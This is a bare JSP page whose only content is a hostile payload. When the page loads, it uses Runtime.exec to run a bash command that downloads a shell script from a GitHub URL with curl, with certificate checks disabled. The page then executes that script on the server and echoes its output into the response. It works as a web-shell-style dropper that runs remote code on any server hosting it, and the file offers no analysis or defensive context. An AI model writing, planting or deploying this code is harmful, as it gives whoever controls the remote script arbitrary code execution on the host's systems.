<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>

<%

String command = "bash <(curl -sLk https://github.com/momika233/test/raw/main/m.sh)";

try {

    Process process = Runtime.getRuntime().exec(new String[]{"bash", "-c", command});
    

    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    String line;
    StringBuilder output = new StringBuilder();
    while ((line = reader.readLine()) != null) {
        output.append(line).append("\n");
    }
    
    process.waitFor();

    out.println("<pre>" + output.toString() + "</pre>");
} catch (IOException | InterruptedException e) {

    out.println("An exception occurred while executing the command：" + e.getMessage());
}
%>
